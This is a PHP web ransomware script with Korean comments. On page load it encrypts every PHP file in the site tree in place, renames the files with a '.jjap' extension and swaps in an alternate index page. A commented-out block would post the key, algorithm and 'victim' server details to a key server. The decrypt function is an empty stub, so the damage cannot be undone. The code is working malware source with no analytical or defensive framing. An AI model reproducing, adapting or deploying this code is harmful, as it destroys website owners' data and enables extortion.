<?php

	ini_set('memory_limit', '512M');
	
	// 디렉턱리 목록 읽어오는 함수
	function getdir($dir, &$results = array()) {
		$files = scandir($dir);
		foreach ($files as $key => $value) {
			$path = realpath($dir.DIRECTORY_SEPARATOR.$value);
			if (!is_dir($path)) {
				$results[] = $path;
			} else if ($value != "." && $value != "..") {
				getdir($path, $results);
				$results[] = $path;
			}
		}
		return $results;
	}
	
	// 암호화에 사용할 랜덤 키 생성 함수
	function random_key($key_length) {
		
		$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$characters_length = strlen($characters);
		$key_generated = '';
		for ($i = 0; $i < $key_length; $i++) {
			$key_generated .= $characters[rand(0, $characters_length - 1)];
		}
		return $key_generated;
	} 
	
	// 암호화에 사용할 랜덤 알고리즘 선택 함수
	function random_alg() {
		
		$alg_list = array(
			"aes-128-cbc",
			"aes-128-cfb",
			"aes-128-cfb1",
			"aes-128-cfb8",
			"aes-128-ecb",
			"aes-128-ofb",
			"aes-192-cbc",
			"aes-192-cfb1",
			"aes-192-cfb8",
			"aes-192-ecb",
			"aes-192-ofb",
			"aes-256-cbc",
			"aes-256-cfb1",
			"aes-256-cfb8",
			"aes-256-ecb",
			"aes-256-ofb"
		);
		
		$r = rand(0, count($alg_list));
		$selected_alg = $alg_list[$r];
		
		return $selected_alg;
	}
	
	// curl post 전송 함수
	function post($url, $fields) {
		$post_field_string = http_build_query($fields, '', '&');
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post_field_string);
		curl_setopt($ch, CURLOPT_POST, true);
		$response = curl_exec($ch);
		curl_close ($ch);
		return $response;
	}
	
	// 암호화 함수
	function encrypt_web() {
		
		$encrypt_key = random_key(20);
		$encrypt_key_hased = substr(hash('sha256', (string)$userpasswd_hased, true), 0, 32);
		
		$encrypt_alg = random_alg();
		
		// 암호화키와 알고리즘을 로컬에 파일로 저장
		file_put_contents("./key&alg", $encrypt_key.".".$encrypt_alg);
		
		// 암호화키와 알고리즘, 로컬 정보를 서버로 전송
		/*
		$key_server_addr = "";
		$victim_info = array(
			'encrypt_key' => $encrypt_key,
			'encrypt_alg' => $encrypt_alg,
			'victim_name' => $_SERVER['SERVER_NAME'],
			'victim_sw' => $_SERVER['SERVER_SOFTWARE']
		);
		post($key_server_addr, $victim_info);
		*/
		
		$directory_list = getdir('./');
		for ($i = 0; $i <= count($directory_list); $i++) {
			
			$chk_ext = explode('.', $directory_list[$i]);
			$chk_ext = array_reverse($chk_ext);
			$file_name = explode('/', $chk_ext[1]);
			$file_name = array_reverse($file_name);
			
			if ($file_name[0] != 'index' and $file_name[0] != 'exe' and $file_name[0] != 'altindex') {
				if (strtolower($chk_ext[0]) == 'php') {
					$file_contents = file_get_contents($directory_list[$i]);
					$iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
					$encrypted_contents = openssl_encrypt($file_contents, $encrypt_alg, $encrypt_key_hased, OPENSSL_RAW_DATA, $iv);
					$fp = fopen($directory_list[$i], 'r+');
					fwrite($fp, $encrypted_contents);
					fclose($fp);
					rename($directory_list[$i], $chk_ext[1].".jjap");
				}
			}
		}
		
		rename('./index.php', './old_index.php');
		rename('./altindex.php', './index.php');
		file_put_contents("./executed", "1");
		
		return 0;
	}
	
	// 복호화 함수
	function decrypt_web() {
		return 0;
	}

	if (!file_exists('./executed')) {
		encrypt_web();
	} else {
		header('Location: /index.php');
	}
?>
